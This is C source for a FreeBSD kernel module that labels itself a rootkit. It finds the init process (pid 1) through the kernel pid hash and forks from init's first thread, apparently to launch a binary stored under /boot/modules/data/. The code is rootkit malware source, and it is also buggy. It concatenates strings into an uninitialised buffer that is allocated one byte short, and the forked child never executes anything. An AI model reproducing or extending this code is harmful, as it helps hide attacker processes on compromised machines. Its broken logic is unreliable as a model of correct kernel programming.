#include <binary.h>
#include <debug.h>

#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/sx.h>
#include <sys/types.h>
#include <sys/proc.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>
#include <sys/libkern.h>

#define BIN_PATH "/boot/modules/data/"
MALLOC_DEFINE(BINARY_BOOT, "binary_boot", "binary_boot");

int boot_binary(char *path){
	LOGI("[rootkit:boot_binary]  BINARY BOOT\n");
	char * new_string = malloc(strlen(BIN_PATH) + strlen(path), BINARY_BOOT, M_WAITOK);
	char * temp = strcat(new_string, BIN_PATH);
	char * final = strcat(temp, path);

	LOGI("[rootkit:boot_binary] new %s\n", new_string);
	LOGI("[rootkit:boot_binary] temp %s\n", temp);
	LOGI("[rootkit:boot_binary]  Attempting to boot %s\n", final);
	
	struct proc * p = find_process(1);
	if(p != 0x00){
		LOGI("[rootkit:boot_binary] Found process with pid %d\n", p->p_pid);
		struct thread * first_thread = FIRST_THREAD_IN_PROC(p);
		LOGI("[rootkit:boot_binary] Found first thread with tid %d\n", first_thread->td_tid);
		struct fork_req fr;
		int error, pid;
		bzero(&fr, sizeof(fr));
		fr.fr_flags = RFFDG | RFPROC;
		fr.fr_pidp = &pid;
		error = fork1(first_thread, &fr);
	}


	return 1;
}


struct proc * find_process(pid_t pid)
{	
	struct proc *p;	
	struct proc *return_p;
	return_p = 0x00;
	p = 0x00;
	LOGI("[rootkit:find_process] Attemping to find process with ID %d\n", pid);

	sx_slock(&allproc_lock);
	
	/* Two options. Iterate over pidhashtabl, or allproc_list. 
	*  Better performance over pidhashtabl */
	LIST_FOREACH(p, PIDHASH(pid), p_list){
		LOGI("[rootkit:find_process] Checking PID:%d\n", p->p_pid);
		if(p->p_pid == pid)
		{
			/* A process is either NEW, NORMAL, ZOMBIE 
			*  ( new means in creation , see proc.h ) */
			if(p->p_state == PRS_NEW)
			{ 
				p = NULL;
				break;
			}
			return_p = p;
			break;
		}
	}

	sx_sunlock(&allproc_lock);
	return return_p;
}






